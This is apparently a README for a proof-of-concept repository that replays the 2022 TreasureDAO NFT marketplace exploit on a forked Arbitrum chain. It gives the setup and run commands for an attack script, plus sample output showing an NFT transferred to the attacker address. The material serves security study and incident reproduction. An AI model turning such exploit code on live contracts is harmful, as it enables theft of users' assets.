# TreasureDAO re-hack PoC

## How to run

Install nodejs/npm first

Set up the `forking url` (in `hardhat.config.ts`)

e.g. https://speedy-nodes-nyc.moralis.io/xxxxxxxxxxx/arbitrum/mainnet (
You need to apply for speedy-nodes from moralis.io)

Then run
```bash
npm install
npx hardhat run scripts/attack.ts
```
You will see similar output later
```
Attacker address: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
NFT owner of SmolBrain 3557: 0x52B24BecaE3fa1036cA0e956cd987D48A8f0e165
Exploiting...
Exploit complete.
NFT owner of SmolBrain 3557: 0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266
```
This means the attack is complete
> The block height of the fork is 7322694


## Link

* https://www.coindesk.com/tech/2022/03/03/stolen-smol-brains-nfts-returned-to-users-hours-after-treasure-exploit/
* https://mp.weixin.qq.com/s/SEbXWmugJBz0C00vyzYcCw
